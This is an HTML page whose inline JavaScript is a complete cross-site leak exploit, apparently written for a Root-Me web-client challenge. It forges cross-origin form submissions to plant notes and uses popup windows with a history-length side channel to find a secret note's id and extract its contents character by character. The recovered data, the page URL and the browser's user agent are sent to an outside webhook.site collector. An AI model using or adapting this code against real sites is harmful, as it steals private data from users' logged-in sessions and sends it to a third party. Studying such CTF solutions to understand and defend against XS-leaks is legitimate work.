<!DOCTYPE html><html><body><script>
const T='https://web-client-ch56.challenge01.root-me.org:58056';
const CB='cb.html';
const WH='https://webhook.site/fe721e7f-adad-4f60-ab60-5d137ff88a8d';
const qs=new URLSearchParams(location.search);
const P={id:qs.get('id'),prefix:qs.get('prefix')||'',skip:parseInt(qs.get('skip')||'1'),max:parseInt(qs.get('max')||'3400')};
let seq=0;const visit=Math.random().toString(36).slice(2,8);
function ib(tag,data,rep){
  const n=rep||1;
  for(let i=0;i<n;i++){
    try{fetch(WH+'?b='+encodeURIComponent(tag)+'&n='+(seq++)+'&v='+visit,{method:'POST',mode:'no-cors',credentials:'omit',headers:{'Content-Type':'text/plain'},body:JSON.stringify({v:visit,t:tag,d:data}),keepalive:true});}catch(e){}
  }
}
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
function wsleep(ms,tag){return sleep(ms);}
const prevH={};
const vTag={};
let lastVerdict='';
window.addEventListener('message',e=>{
  const d=e.data;
  if(!d||!d.cb)return;
  const s=d.s,c=d.c,h=parseInt(d.h);
  if(c===undefined||isNaN(h))return;
  if(prevH[s]!==undefined){
    const dh=h-prevH[s];
    vTag[c]=dh;
    if(c.indexOf('E|')!==0&&c.indexOf('V')!==0){lastVerdict=s+'|'+c+'='+h+'/'+dh;}
  }else{
    if(c.indexOf('E|')!==0&&c.indexOf('V')!==0){lastVerdict=s+'|'+c+'='+h+'/x';}
  }
  prevH[s]=h;
});
const NSLOT=4;
const slots=[];
function newPop(slot){
  const name='s'+slot+'x'+Math.random().toString(36).slice(2,6);
  let w=null;
  try{w=window.open('about:blank',name);}catch(e){}
  return {win:w,name,cycles:0,ok:w?1:0};
}
function freshPop(s){
  const sl=slots[s];
  if(sl&&sl.win){try{sl.win.close();}catch(e){}}
  slots[s]=newPop(s);
  prevH[s]=undefined;
  return slots[s];
}
function plantVia(p,id,title){
  try{
    const form=document.createElement('form');
    form.action=T+'/notes/'+id;form.method='POST';form.target=p.name;
    const i1=document.createElement('input');i1.name='title';i1.value=title;
    const i2=document.createElement('input');i2.name='message';i2.value='x';
    form.appendChild(i1);form.appendChild(i2);
    document.body.appendChild(form);form.submit();
    setTimeout(()=>{try{form.remove();}catch(e){}},8000);
    return true;
  }catch(e){return false;}
}
async function cycle(s,id,doPlant,query,tag){
  let pop=slots[s];
  if(!pop||!pop.win||pop.win.closed||pop.cycles>=10){
    pop=freshPop(s);
    if(!pop.win)return {err:'nopop'};
  }
  if(doPlant){plantVia(pop,id,'!probe!');await wsleep(500);}
  try{pop.win.location=T+'/notes/'+id+'/'+encodeURIComponent(query);}catch(e){return {err:'nav'};}
  await wsleep(400);
  try{pop.win.stop();}catch(e){}
  try{pop.win.location=CB+'?c='+encodeURIComponent(tag)+'&s='+s+'&pv='+encodeURIComponent(lastVerdict);}catch(e){return {err:'cbnav'};}
  pop.cycles++;
  await wsleep(300);
  return {ok:1};
}
const A1='abcdefghijklmnopqrstuvwxyz0123456789_';
async function scanCycles(s,id,n){
  const tags=[];
  for(let i=0;i<n;i++){
    const tag='S'+id+'x'+i;
    tags.push(tag);
    await cycle(s,id,true,'!probe',tag);
    await wsleep(150);
  }
  await wsleep(800);
  const ds=tags.map(t=>vTag[t]);
  const loaded=ds.filter(x=>x!==undefined);
  ib('scancyc',{id,ds:ds.join(',')},2);
  return loaded.length>0&&loaded.every(x=>x===2);
}
async function extractPass(s,id,prefix){
  for(const c of A1){
    await cycle(s,id,false,prefix+c,'E|'+prefix+'|'+c);
    await wsleep(100);
  }
  await wsleep(800);
  const m=[];
  for(const c of A1){if(vTag['E|'+prefix+'|'+c]===1)m.push(c);}
  ib('p2res',{id,prefix,m:m.join('')},4);
  return m;
}
(async()=>{
  ib('start',{href:location.href,ua:navigator.userAgent.slice(0,90)},2);
  for(let i=0;i<NSLOT;i++){slots[i]=newPop(i);prevH[i]=undefined;}
  ib('popinit',{n:slots.filter(x=>x.ok).length});
  for(let s=0;s<NSLOT;s++){
    await cycle(s,999999999,true,'!probe','CTRL'+s+'x0');
    await wsleep(700);
  }
  ib('ctrls-done',{},2);
  if(P.id){
    await extractPass(0,parseInt(P.id),P.prefix);
    ib('done',{},2);
    return;
  }
  let stop=false;
  const workers=[];
  for(let s=0;s<NSLOT;s++){
    workers.push((async()=>{
      let myid=P.skip+s;
      while(myid<P.max&&!stop){
        const tag='S'+myid+'x0';
        await cycle(s,myid,true,'!probe',tag);
        await wsleep(250);
        if(vTag[tag]===2){
          ib('hit2',{id:myid},3);
          const ok=await scanCycles(s,myid,2);
          if(ok){
            ib('CAND',{id:myid},6);
            stop=true;
            await extractPass(s,myid,'');
            return;
          }else{ib('rej',{id:myid},2);}
        }
        if(myid%10===0){ib('prog',{id:myid,lv:lastVerdict},1);}
        myid+=NSLOT;
      }
    })());
  }
  await Promise.all(workers);
  ib('scan-end',{},2);
})();
</script></body></html>
